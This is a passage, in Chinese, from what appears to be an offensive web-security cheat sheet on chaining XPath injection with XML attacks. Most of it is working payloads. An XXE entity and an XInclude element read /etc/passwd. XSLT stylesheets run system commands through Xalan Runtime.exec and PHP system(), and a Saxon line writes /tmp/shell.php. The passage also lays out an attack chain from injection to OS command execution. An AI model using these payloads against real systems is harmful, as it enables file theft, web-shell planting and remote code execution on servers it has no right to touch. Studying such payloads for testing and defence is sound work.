## 八、XML安全联动：XXE/XInclude/XSLT

### 8.1 XXE 与 XPath 联动
当注入点位于**XML文档结构**（而非查询字符串）时，可注入DTD实体：
```
<?xml version="1.0"?>
<!DOCTYPE user [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<user><name>&xxe;</name></user>
```
```
# 组合拳：先XXE读配置 → XPath查询新数据 → 二次注入
# 场景：SOAP接口、SAML断言注入、XML上传解析
# 防护注意：即使禁用XXE，XInclude仍可能开启（见8.2）
```

### 8.2 XInclude 文件读取
```
<root xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include href="file:///etc/passwd" parse="text"/>
</root>
```
与XPath注入联动：注入点闭合后追加`<xi:include>`内容，或利用XPath查询的XML参数注入XInclude payload；`parse="text"`可读任意文本文件。

### 8.3 XSLT服务器端RCE（保留深化）
若用户输入能控制XSLT样式表或样式表参数，扩展函数直接RCE：
```xml
<!-- Java XSLT (Xalan) Runtime.exec -->
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime"
xmlns:ob="http://xml.apache.org/xalan/java/java.lang.Object">
<xsl:template match="/">
  <xsl:variable name="rtObj" select="rt:getRuntime()"/>
  <xsl:variable name="exec" select="rt:exec($rtObj,'id')"/>
  Command executed!
</xsl:template>
</xsl:stylesheet>

<!-- PHP XSLT -->
<xsl:value-of select="php:function('system','id')"/>

<!-- Saxon/Java 文件写入 -->
<xsl:variable name="f" select="new java.io.FileWriter('/tmp/shell.php')"/>
```
**攻击链**：XPath注入点若暴露XSLT渲染（搜索/报表/导出功能），注入`<xsl:stylesheet>`片段触发模板加载 → 扩展函数RCE。Plesk CVE-2026-44962（CVSS 9.9）即展示XPath注入在真实产品中一路通向OS命令执行。

